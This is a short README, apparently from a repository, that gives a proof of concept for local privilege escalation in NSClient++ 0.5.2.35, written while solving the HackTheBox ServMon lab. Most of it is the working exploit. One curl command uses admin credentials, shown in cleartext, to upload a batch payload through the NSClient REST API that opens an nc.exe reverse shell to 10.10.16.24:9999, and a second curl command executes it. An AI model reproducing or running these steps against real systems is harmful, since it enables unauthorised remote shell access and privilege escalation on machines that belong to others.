# NSClient-0.5.2.35---Privilege-Escalation
Easy LPE without interacting with the console UI. 

#### **This can be written in any scripting language of your choice, the logic stays the same**

I made this while doing the ServMon HTB Box due to the fact I met an unstable UI or restricted to only 127.0.0.1. 

## Requirements:
 - Bring nc.exe on target host.
 - Have admin credentials.

## PoC:
 1. Create your payload and PUT it via API call: `curl -k -i -u admin:ew2x6SsGTxjRwXOT -X PUT https://localhost:8443/api/v1/scripts/ext/scripts/exploit2.bat -d "C:\Users\Nadine\nc.exe -e cmd.exe 10.10.16.24 9999"`;
 2. Set-up a listener;
 3. Execute the payload via API call: `curl -k -u admin:ew2x6SsGTxjRwXOT https://127.0.0.1:8443/api/v1/queries/exploit2/commands/execute?time=1m/`;



References used:
 - https://github.com/xtizi/NSClient-0.5.2.35---Privilege-Escalation/tree/master
 - https://nsclient.org/docs/api/rest/
